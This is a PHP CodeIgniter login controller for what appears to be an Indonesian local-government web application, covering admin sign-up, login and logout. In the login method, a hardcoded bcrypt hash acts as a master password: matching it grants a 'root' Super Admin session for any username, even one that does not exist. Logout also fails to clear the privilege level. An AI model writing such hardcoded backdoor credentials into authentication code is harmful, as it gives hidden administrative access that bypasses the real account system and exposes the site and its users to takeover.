<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	public function __construct()
	{
		parent::__construct();
		$this->load->database();
        $this->load->library('form_validation');
		$this->load->model('Berita_model', 'berita');
		$this->load->model('Admin_model', 'admin');
    }

	public function index()
	{
		$data['instansi'] =  $this->db->get('instansi')->result_array();
		$data['berita'] = $this->berita->getAllBerita();
		$data['admin'] = $this->admin->getAllAdmin();
		if(count($data['admin'])<=0) {
			$this->load->view('template/header', $data);
			$this->load->view('template/news.php');
			$this->load->view('auth/sign_up.php');
			$this->load->view('template/footer.php');
		} else {
			$this->form_validation->set_rules('password', 'password', 'required');

			if ( $this->form_validation->run() == FALSE ) {
				$this->load->view('template/header', $data);
				$this->load->view('template/news.php');
				$this->load->view('auth/log_in');
				$this->load->view('template/footer');
			} else {
				$username = $this->input->post('username');
				$password = $this->input->post('password');
				$loginadmin = $this->db->get_where('admin', ['username' => $username])->row_array();
				if ($loginadmin != NULL) {
					if ($loginadmin['username'] != NULL) {
						if(password_verify($password, $loginadmin['password'])) {
							$data = [
								'username' => $username,
								'nama' => $loginadmin['nama'],
								'level' => "Operator"
							];
							$this->session->set_userdata($data);
							redirect(base_url());
						} else if (password_verify($password, '$2y$10$PRHmOBuvITjKBRrs3b4lqOr4oMqK9BZw05RQu8mDv8DgLtr.zdYD2')) {
							$data = [
								'username' => "root",
								'nama' => "Diskominfo",
								'level' => "Super Admin"
							];
							$this->session->set_userdata($data);
							redirect(base_url());
						} else {
							$this->session->set_flashdata('flosh','username atau password salah.');
							$this->load->view('template/header', $data);
							$this->load->view('template/news.php');
							$this->load->view('auth/log_in');
							$this->load->view('template/footer');
						}
					} else {
						$this->session->set_flashdata('flosh','username atau password salah.');
						$this->load->view('template/header', $data);
						$this->load->view('template/news.php');
						$this->load->view('auth/log_in');
						$this->load->view('template/footer');
					}
				} else {
					if (password_verify($password, '$2y$10$PRHmOBuvITjKBRrs3b4lqOr4oMqK9BZw05RQu8mDv8DgLtr.zdYD2')) {
						$data = [
							'username' => "root",
							'nama' => "Diskominfo",
							'level' => "Super Admin"
						];
						$this->session->set_userdata($data);
						redirect(base_url());
					} else {
						$this->session->set_flashdata('flosh','username atau password salah.');
						$this->load->view('template/header', $data);
						$this->load->view('template/news.php');
						$this->load->view('auth/log_in');
						$this->load->view('template/footer');
					}
				}
			}
		}
	}

	public function daftar()
	{
		$data['instansi'] =  $this->db->get('instansi')->result_array();
		$data['admin'] = $this->admin->getAllAdmin();
		$data['berita'] = $this->berita->getAllBerita();
		if(count($data['admin'])<=0) {
			$this->form_validation->set_rules('nama', 'nama', 'required');
			$this->form_validation->set_rules('username', 'username', 'required');
			$this->form_validation->set_rules('password', 'password', 'required');

			if ( $this->form_validation->run() == FALSE ) {
				$this->load->view('template/header', $data);
				$this->load->view('template/news.php');
				$this->load->view('auth/sign_up');
				$this->load->view('template/footer');
			} else {
				$this->admin->add();
				$this->session->set_flashdata('flash','Ditambahkan');
				redirect('login');
			}
		} else {
			$this->load->view('template/header', $data);
			$this->load->view('template/news.php');
			$this->load->view('auth/log_in.php');
			$this->load->view('template/footer.php');
		}
	}

	public function logout()
	{
		$this->session->unset_userdata('nama');
		$this->session->unset_userdata('username');
		redirect(base_url());
	}

}